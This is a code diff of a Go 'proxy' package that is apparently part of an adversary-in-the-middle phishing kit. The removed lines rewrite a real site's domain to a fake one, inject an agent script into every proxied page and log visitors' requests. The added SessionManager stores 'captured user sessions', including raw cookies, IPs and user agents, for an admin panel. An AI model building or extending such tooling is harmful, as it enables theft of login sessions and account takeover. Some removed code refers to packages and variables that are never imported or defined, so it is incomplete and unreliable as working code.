@@ -1,241 +1,190 @@
 package proxy
 
 import (
-	"bytes"
-	"crypto/tls"
+	"context"
 	"database/sql"
 	"encoding/json"
+	"errors"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"net/http"
-	"net/url"
-	"os"
-	"regexp"
 	"strings"
+	"sync"
 	"time"
 )
 
-// --- Logging Utilities ---
-
-// Enhanced request logging with sensitive data filtering
-func logRequestData(sessionID string, req *http.Request) {
-	// Filter sensitive headers
-	filteredHeaders := make(http.Header)
-	for k, v := range req.Header {
-		if strings.EqualFold(k, "Authorization") || strings.EqualFold(k, "Cookie") {
-			filteredHeaders[k] = []string{"[REDACTED]"}
-		} else {
-			filteredHeaders[k] = v
-		}
-	}
-
-	data := fmt.Sprintf("[%s] %s %s\nSessionID: %s\nHeaders: %v\nUser-Agent: %s\nIP: %s\n",
-		time.Now().Format(time.RFC3339Nano),
-		req.Method,
-		req.URL.String(),
-		sessionID,
-		filteredHeaders,
-		req.UserAgent(),
-		getRealIP(req))
-
-	if req.Method == "POST" {
-		body, _ := io.ReadAll(req.Body)
-		req.Body = io.NopCloser(bytes.NewReader(body))
-		
-		// Filter sensitive POST data
-		if strings.Contains(req.Header.Get("Content-Type"), "application/json") {
-			var jsonData map[string]interface{}
-			if err := json.Unmarshal(body, &jsonData); err == nil {
-				if _, exists := jsonData["password"]; exists {
-					jsonData["password"] = "[REDACTED]"
-					body, _ = json.Marshal(jsonData)
-				}
-			}
-		}
-		
-		data += fmt.Sprintf("Body: %s\n", string(body))
-	}
-
-	writeLog(data)
+// Session represents a captured user session
+type Session struct {
+	ID         string    `json:"id"`
+	Cookies    string    `json:"cookies"`
+	UserAgent  string    `json:"user_agent"`
+	IP         string    `json:"ip"`
+	LastActive time.Time `json:"last_active"`
+	Metadata   string    `json:"metadata"`
 }
 
-// Secure session data logging
-func logSessionData(key, value string) {
-	// Redact sensitive tokens
-	if strings.Contains(key, "token") || strings.Contains(key, "secret") {
-		value = "[REDACTED]"
-	}
-	writeLog(fmt.Sprintf("[%s] %s: %s\n", 
-		time.Now().Format(time.RFC3339Nano), key, value))
+// SessionManager handles all session operations
+type SessionManager struct {
+	db     *sql.DB
+	mu     sync.RWMutex
+	logger *log.Logger
 }
 
-// Thread-safe log writing
-func writeLog(data string) {
-	logMutex.Lock()
-	defer logMutex.Unlock()
-	
-	if _, err := logFile.WriteString(data); err != nil {
-		log.Printf("Failed to write log: %v", err)
+// NewSessionManager creates a new session manager instance
+func NewSessionManager(db *sql.DB, logger *log.Logger) *SessionManager {
+	if logger == nil {
+		logger = log.Default()
+	}
+	return &SessionManager{
+		db:     db,
+		logger: logger,
 	}
 }
 
-// --- Database Utilities ---
+// Save stores a session in the database
+func (sm *SessionManager) Save(ctx context.Context, session Session) error {
+	sm.mu.Lock()
+	defer sm.mu.Unlock()
 
-// Atomic session save operation
-func saveSessionToDB(session Session) error {
-	tx, err := db.Begin()
-	if err != nil {
-		return fmt.Errorf("failed to begin transaction: %w", err)
+	if sm.db == nil {
+		return errors.New("database not initialized")
 	}
-	defer tx.Rollback()
 
-	_, err = tx.Exec(`INSERT OR REPLACE INTO sessions 
+	_, err := sm.db.ExecContext(ctx, `
+		INSERT OR REPLACE INTO sessions 
 		(id, cookies, user_agent, ip, last_active, metadata) 
 		VALUES (?, ?, ?, ?, ?, ?)`,
 		session.ID,
 		session.Cookies,
 		session.UserAgent,
 		session.IP,
-		session.LastActive.Format(time.RFC3339Nano),
-		session.Metadata)
-	
-	if err != nil {
-		return fmt.Errorf("failed to save session: %w", err)
-	}
-	
-	return tx.Commit()
-}
-
-// --- Network Utilities ---
-
-// Get real client IP considering proxies
-func getRealIP(r *http.Request) string {
-	for _, h := range []string{"X-Forwarded-For", "X-Real-IP"} {
-		if ip := r.Header.Get(h); ip != "" {
-			return strings.Split(ip, ",")[0]
-		}
-	}
-	
-	if ip, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
-		return ip
-	}
-	
-	return r.RemoteAddr
-}
-
-// Create secure TLS configuration
-func createTLSConfig() *tls.Config {
-	return &tls.Config{
-		MinVersion: tls.VersionTLS12,
-		CurvePreferences: []tls.CurveID{
-			tls.X25519,
-			tls.CurveP256,
-		},
-		CipherSuites: []uint16{
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-		},
-	}
-}
-
-// --- Content Manipulation Utilities ---
-
-func replaceAllDomains(body []byte) []byte {
-	domainMappings := map[string]string{
-		targetURL:                     "https://" + fakeDomain,
-		"realwebsite.com":             fakeDomain,
-		strings.TrimPrefix(targetURL, "https://"): fakeDomain,
-		strings.TrimPrefix(targetURL, "http://"):  fakeDomain,
-	}
-	
-	for old, new := range domainMappings {
-		body = bytes.ReplaceAll(body, []byte(old), []byte(new))
-	}
-	return body
-}
-
-func injectJS(body []byte) []byte {
-	// Only inject into HTML documents
-	if !bytes.Contains(body, []byte("<html")) {
-		return body
-	}
-
-	// Parse and modify DOM properly
-	doc, err := html.Parse(bytes.NewReader(body))
-	if err != nil {
-		return body
-	}
-
-	var injectNode = &html.Node{
-		Type: html.ElementNode,
-		Data: "script",
-		Attr: []html.Attribute{
-			{Key: "src", Val: "/" + jsAgent},
-		},
-	}
-
-	var f func(*html.Node)
-	f = func(n *html.Node) {
-		if n.Type == html.ElementNode && n.Data == "head" {
-			n.AppendChild(injectNode)
-		}
-		for c := n.FirstChild; c != nil; c = c.NextSibling {
-			f(c)
-		}
-	}
-	f(doc)
-
-	var buf bytes.Buffer
-	html.Render(&buf, doc)
-	return buf.Bytes()
-}
-
-func blockSensitiveContent(body []byte) []byte {
-	for _, keyword := range blockedKeywords {
-		re := regexp.MustCompile(`(?i)(` + regexp.QuoteMeta(keyword) + `)`)
-		body = re.ReplaceAll(body, []byte("[REDACTED]"))
-	}
-	return body
-}
-
-// --- Session Utilities ---
-
-func getSessionID(r *http.Request) string {
-	if cookie, err := r.Cookie("session_id"); err == nil {
-		return cookie.Value
-	}
-	return r.Header.Get("X-Session-ID")
-}
-
-func bindSession(body []byte, r *http.Request) []byte {
-	sessionID := getSessionID(r)
-	if sessionID == "" {
-		return body
-	}
-
-	script := fmt.Sprintf(`
-		<script nonce="%x">
-			sessionStorage.setItem('session_id','%s');
-			localStorage.setItem('session_data', JSON.stringify({
-				ip: '%s',
-				userAgent: '%s',
-				lastActive: %d
-			}));
-		</script>`,
-		generateNonce(),
-		sessionID,
-		getRealIP(r),
-		r.UserAgent(),
-		time.Now().Unix(),
+		session.LastActive.Format(time.RFC3339),
+		session.Metadata,
 	)
 
-	return bytes.Replace(body, []byte("</body>"), append([]byte(script), []byte("</body>")...), 1)
+	if err != nil {
+		sm.logger.Printf("Failed to save session %s: %v", session.ID, err)
+		return fmt.Errorf("failed to save session: %w", err)
+	}
+	return nil
 }
 
-func generateNonce() string {
-	buf := make([]byte, 16)
-	rand.Read(buf)
-	return fmt.Sprintf("%x", buf)
+// GetByID retrieves a session by its ID
+func (sm *SessionManager) GetByID(ctx context.Context, id string) (Session, error) {
+	sm.mu.RLock()
+	defer sm.mu.RUnlock()
+
+	var s Session
+	var lastActive string
+
+	err := sm.db.QueryRowContext(ctx, `
+		SELECT id, cookies, user_agent, ip, last_active, metadata 
+		FROM sessions WHERE id = ?`, id).Scan(
+		&s.ID,
+		&s.Cookies,
+		&s.UserAgent,
+		&s.IP,
+		&lastActive,
+		&s.Metadata,
+	)
+
+	if err != nil {
+		if errors.Is(err, sql.ErrNoRows) {
+			return Session{}, fmt.Errorf("session not found")
+		}
+		return Session{}, fmt.Errorf("failed to get session: %w", err)
+	}
+
+	s.LastActive, _ = time.Parse(time.RFC3339, lastActive)
+	return s, nil
+}
+
+// GetAll retrieves all sessions sorted by last activity
+func (sm *SessionManager) GetAll(ctx context.Context) ([]Session, error) {
+	sm.mu.RLock()
+	defer sm.mu.RUnlock()
+
+	rows, err := sm.db.QueryContext(ctx, `
+		SELECT id, cookies, user_agent, ip, last_active, metadata 
+		FROM sessions ORDER BY last_active DESC`)
+	if err != nil {
+		return nil, fmt.Errorf("failed to query sessions: %w", err)
+	}
+	defer rows.Close()
+
+	var sessions []Session
+	for rows.Next() {
+		var s Session
+		var lastActive string
+		if err := rows.Scan(
+			&s.ID,
+			&s.Cookies,
+			&s.UserAgent,
+			&s.IP,
+			&lastActive,
+			&s.Metadata,
+		); err != nil {
+			return nil, fmt.Errorf("failed to scan session: %w", err)
+		}
+
+		s.LastActive, _ = time.Parse(time.RFC3339, lastActive)
+		sessions = append(sessions, s)
+	}
+
+	if err := rows.Err(); err != nil {
+		return nil, fmt.Errorf("rows error: %w", err)
+	}
+
+	return sessions, nil
+}
+
+// CleanOld removes sessions older than the specified duration
+func (sm *SessionManager) CleanOld(ctx context.Context, maxAge time.Duration) (int64, error) {
+	sm.mu.Lock()
+	defer sm.mu.Unlock()
+
+	res, err := sm.db.ExecContext(ctx, `
+		DELETE FROM sessions 
+		WHERE last_active < ?`,
+		time.Now().Add(-maxAge).Format(time.RFC3339),
+	)
+
+	if err != nil {
+		sm.logger.Printf("Failed to clean old sessions: %v", err)
+		return 0, fmt.Errorf("failed to clean old sessions: %w", err)
+	}
+
+	count, _ := res.RowsAffected()
+	return count, nil
+}
+
+// GetClientIP extracts the client IP from a request, considering proxies
+func GetClientIP(r *http.Request) string {
+	forwarded := r.Header.Get("X-Forwarded-For")
+	if forwarded != "" {
+		return strings.Split(forwarded, ",")[0]
+	}
+	if realIP := r.Header.Get("X-Real-IP"); realIP != "" {
+		return realIP
+	}
+	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
+	return ip
+}
+
+// ToJSON converts a session to pretty-printed JSON for the admin panel
+func (s Session) ToJSON() ([]byte, error) {
+	return json.MarshalIndent(struct {
+		ID         string `json:"id"`
+		UserAgent  string `json:"user_agent"`
+		IP         string `json:"ip"`
+		LastActive string `json:"last_active"`
+		CookieCount int   `json:"cookie_count"`
+	}{
+		ID:         s.ID,
+		UserAgent:  s.UserAgent,
+		IP:         s.IP,
+		LastActive: s.LastActive.Format(time.RFC3339),
+		CookieCount: len(strings.Split(s.Cookies, ";")),
+	}, "", "  ")
 }
